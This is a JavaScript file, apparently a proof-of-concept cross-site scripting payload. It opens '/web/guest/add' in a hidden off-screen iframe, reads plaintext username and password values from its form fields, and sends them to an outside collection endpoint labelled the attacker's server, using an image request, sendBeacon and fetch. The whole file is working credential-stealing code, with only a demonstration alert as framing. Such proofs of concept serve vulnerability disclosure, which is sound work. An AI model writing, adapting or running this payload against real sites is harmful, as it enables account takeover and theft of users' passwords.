// credential-stealer.js - Extracts plaintext passwords from /web/guest/add
(function() {
    function extractPassword() {
        // Create hidden iframe to load the password page
        var iframe = document.createElement('iframe');
        iframe.src = '/web/guest/add';
        iframe.style.position = 'absolute';
        iframe.style.left = '-9999px';
        iframe.style.width = '1px';
        iframe.style.height = '1px';
        document.body.appendChild(iframe);

        iframe.onload = function() {
            var attempts = 0;
            var maxAttempts = 30; // Try for 30 seconds

            // Poll the iframe content until password is found
            var pollForPassword = setInterval(function() {
                attempts++;

                try {
                    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

                    // Wait for iframe to fully load
                    if (!iframeDoc || iframeDoc.readyState !== 'complete') {
                        return; // Keep waiting
                    }

                    // Extract password from plaintext input fields
                    var pwdInput = iframeDoc.querySelector('input[name="fake_password"]');
                    var userInput = iframeDoc.querySelector('input[name="fake_username"]');

                    if (!pwdInput || !userInput) {
                        if (attempts >= maxAttempts) {
                            clearInterval(pollForPassword);
                            alert('Failed: Password inputs not found in DOM');
                        }
                        return;
                    }

                    // Get plaintext password directly from input value
                    var password = pwdInput.value || pwdInput.getAttribute('value') || '';
                    var username = userInput.value || userInput.getAttribute('value') || '';

                    if (password && password.length > 0) {
                        clearInterval(pollForPassword);

                        // Exfiltrate credentials to attacker's server
                        var attackerServer = 'https://naysser.free.beeceptor.com';
                        var payload = '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password);

                        // Method 1: Image tag (bypasses CORS, most reliable)
                        var img = new Image();
                        img.src = attackerServer + payload;
                        document.body.appendChild(img);

                        // Method 2: sendBeacon (reliable for logging)
                        if (navigator.sendBeacon) {
                            navigator.sendBeacon(attackerServer + payload);
                        }

                        // Method 3: Fetch API (backup method)
                        fetch(attackerServer + payload).catch(function(){});

                        // Display stolen credentials (for PoC demonstration)
                        alert('CREDENTIALS STOLEN!\n\nEmail: ' + username + '\nPassword: ' + password + '\n\nSent to: ' + attackerServer);

                        // Cleanup
                        if (iframe.parentNode) {
                            iframe.parentNode.removeChild(iframe);
                        }
                    } else if (attempts >= maxAttempts) {
                        clearInterval(pollForPassword);
                        alert('Timeout: Password field was empty after 30 seconds');
                    }

                } catch(e) {
                    if (attempts >= maxAttempts) {
                        clearInterval(pollForPassword);
                        alert('Error accessing iframe: ' + e.message);
                    }
                }
            }, 1000); // Check every second
        };

        iframe.onerror = function() {
            alert('Failed to load /web/guest/add page');
        };
    }

    // Execute when DOM is ready
    if (document.body) {
        extractPassword();
    } else if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', extractPassword);
    } else {
        window.addEventListener('load', extractPassword);
    }
})();
